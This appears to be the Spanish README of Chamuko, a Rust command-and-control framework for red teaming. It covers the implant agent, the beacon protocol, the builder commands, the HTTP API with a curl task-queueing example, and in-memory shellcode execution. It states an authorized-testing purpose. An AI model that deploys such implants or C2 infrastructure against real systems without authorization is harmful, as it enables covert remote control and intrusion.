# Chamuko C2

Framework de red teaming multi-plataforma en Rust. Tiene tres piezas: el agente (implant) que corre en la máquina objetivo, el servidor C2 con interfaz de terminal, y un builder que genera agentes con la configuración ya embebida.

> **Aviso:** Esto es para pruebas de penetración autorizadas, ejercicios de red teaming y laboratorios. Usarlo contra sistemas de terceros sin permiso es ilegal.

## Qué trae

- **Agente multi-plataforma:** Linux, Windows y macOS. Sin dependencias del sistema.
- **HTTP y HTTPS:** registro, beacon con sleep y jitter, tareas y resultados. El TLS va con rustls, compilado dentro del binario.
- **Token compartido:** C2 y agentes se autentican con el mismo Bearer (`--token` o `CHAMUKO_TOKEN`).
- **Sleep y jitter en caliente:** los cambias desde la TUI y el agente los aplica en el siguiente beacon, sin reiniciarlo.
- **Se recupera solo:** si reinicias el C2, el agente ve el `404`, se vuelve a registrar y sigue.
- **Plugins:** cada comando es un plugin estático. El `PluginRegistry` manda la tarea al primero que la soporte.
- **Comandos incluidos:** `exec`, `info`, `whoami`, `hostname`, `pwd`, `ls`, `cd`, `help`.
- **TUI en rojo y negro:** lista de agentes, consola por agente, barra de comandos e historial con flechas.
- **Builder:** compila el agente con URL, sleep, jitter, nombre y token embebidos. Cross-compila, por ejemplo Windows desde Linux.
- **API HTTP:** `/register`, `/beacon`, `/results`, `/enqueue`, `/agents`, `/health`, por si quieres manejarlo desde otro cliente. Cuatro workers y bodies de hasta 1 MiB.

## Cómo está montado

```
chamuko/
├── crates/
│   ├── plugin-api/   Trait Plugin, LifecycleEvent, CommandOutput
│   ├── core/         PluginRegistry: registro, dispatch y routing
│   ├── protocol/     Tipos compartidos agente↔C2 (JSON)
│   ├── agent/        Cliente C2 + loop de beacon + plugin de comandos
│   ├── c2/           Servidor HTTP + TUI (ratatui/crossterm)
│   └── builder/      Genera binarios de agente con config embebida
└── Cargo.toml        Workspace + perfil release (LTO, strip, panic=abort)
```

### Cómo hablan agente y C2

```
Agente                          C2
  |  POST /register  ----------->  asigna ID, fija sleep/jitter
  |  <----------- {id, sleep, jitter}
  |
  |  POST /beacon {id}  -------->  devuelve tareas + sleep/jitter actuales
  |  <----------- {tasks: [...], sleep, jitter}
  |
  |  ejecuta cada tarea vía plugins
  |  POST /results {id, results} ->  almacena y muestra en consola
  |
  |  (sleep + jitter) y repite
  |
  |  si el C2 responde 404 (perdió el estado):
  |  POST /register  ----------->  se re-registra y continúa
```

## Antes de compilar

- Rust 1.85 o superior (aquí se probó con 1.92).
- Para Windows desde Linux: `rustup target add x86_64-pc-windows-gnu` y `mingw-w64` instalado.

## Compilar

```bash
# Todo el workspace
cargo build --workspace

# Release (agente pequeño: LTO, strip, panic=abort)
cargo build --release -p chamuko-agent
cargo build --release -p chamuko-c2
cargo build --release -p chamuko-builder
```

## Uso

### 1. Arrancar el C2

```bash
# En local, sin auth (solo loopback)
cargo run -p chamuko-c2 -- --listen 127.0.0.1:8080

# En red, con token obligatorio
cargo run -p chamuko-c2 -- --port 8080 --token "$(openssl rand -hex 16)"

# Headless, sin TUI (servidores o pruebas)
cargo run -p chamuko-c2 -- --port 8080 --token "$TOKEN" --headless
```

Opciones: `--listen <addr>` (por ejemplo `0.0.0.0:8080`), `--port <port>`, `--token <tok>` o `CHAMUKO_TOKEN`, `--headless`.

Sin token solo arranca en loopback. Con cualquier otra dirección se niega, para no dejar una API que ejecuta comandos abierta a la red.

### 2. Generar el agente

```bash
# Linux/macOS
cargo run -p chamuko-builder -- \
  --url https://TU_IP:8443 \
  --sleep 10 \
  --jitter 3 \
  --name oficina-finanzas \
  --token "$TOKEN" \
  --output ./agent

# Windows (cross-compile desde Linux)
cargo run -p chamuko-builder -- \
  --url http://TU_IP:8080 \
  --target x86_64-pc-windows-gnu \
  --output ./agent.exe
```

El builder mete `CHAMUKO_C2_URL`, `CHAMUKO_SLEEP`, `CHAMUKO_JITTER`, `CHAMUKO_NAME` y `CHAMUKO_TOKEN` en el binario con `option_env!`. En ejecución puedes pisar esos valores con `--url`, `--sleep`, `--jitter`, `--name`, `--token` y `--once`.

### 3. Lanzar el agente

```bash
./agent                        # usa lo que trae embebido
./agent --once                 # un beacon y sale, para probar
./agent --url https://OTRO_C2:9090 --token "$TOKEN"  # pisa la config
```

### 4. Manejar agentes desde la TUI

| Comando | Qué hace |
|---------|----------|
| `list` | Ver agentes conectados |
| `use <id>` | Elegir un agente |
| `exec <cmd> [args...]` | Ejecutar un comando en el agente |
| `info` | Datos del host |
| `whoami` | Usuario actual |
| `hostname` | Nombre del host |
| `pwd` | Directorio actual |
| `ls [dir]` | Listar un directorio |
| `cd <dir>` | Cambiar de directorio |
| `sleep <s>` | Cambiar el sleep (se aplica en el siguiente beacon) |
| `jitter <s>` | Cambiar el jitter (se aplica en el siguiente beacon) |
| `shellcode <file>` | Manda shellcode XOR+base64 para ejecutarlo en memoria |
| `clear` | Reiniciar el scroll de la consola |
| `help` | Ayuda |
| `quit` o `Ctrl+C` | Salir |

Teclas: `←/→` o `Tab` para cambiar de agente, `↑/↓` para el historial, `Shift+↑/↓` para hacer scroll en la consola.

## API HTTP

| Método | Ruta | Qué hace |
|--------|------|----------|
| POST | `/register` | Registra un agente: `{agent, sleep?, jitter?}` → `{id, sleep, jitter}` |
| POST | `/beacon` | El agente pide tareas: `{id}` → `{tasks: [...], sleep, jitter}`. `404` si no lo conoce |
| POST | `/results` | El agente manda resultados: `{id, results: [...]}`. `404` si no lo conoce |
| POST | `/enqueue` | Encola una tarea: `{id, command, args}` → `{task_id}` |
| GET | `/agents` | Agentes con estado, sleep y jitter |
| GET | `/health` | Health check, sin token |

Todo menos `/health` pide `Authorization: Bearer <token>` cuando arrancas el C2 con `--token` o `CHAMUKO_TOKEN`. Sin token, solo acepta loopback.

Con curl:

```bash
curl -X POST http://127.0.0.1:8080/enqueue \
  -H 'Authorization: Bearer TU_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"id":"chamuko-0001","command":"exec","args":["whoami"]}'
```

## Multi-plataforma

El agente tira de `std::process`, `std::fs` y `std::env`, y compila para:

- `x86_64-unknown-linux-gnu`
- `x86_64-pc-windows-gnu` / `x86_64-pc-windows-msvc`
- `x86_64-apple-darwin` / `aarch64-apple-darwin`

Lo que cambia según el sistema y ya está resuelto:

- **Variables de entorno:** `HOSTNAME`/`COMPUTERNAME` y `USER`/`USERNAME`.
- **Shell:** en Windows `exec` va por `cmd /C`; en Unix se lanza directo.
- **Rutas:** `cd` entiende letras de unidad (`C:\`) en Windows y rutas absolutas en Unix.
- **Extensiones:** el builder pone `.exe` solo cuando el target es Windows.

## Tests

```bash
cargo test --workspace
```

## Licencia

Para uso educativo y red teaming autorizado. Sin garantías.
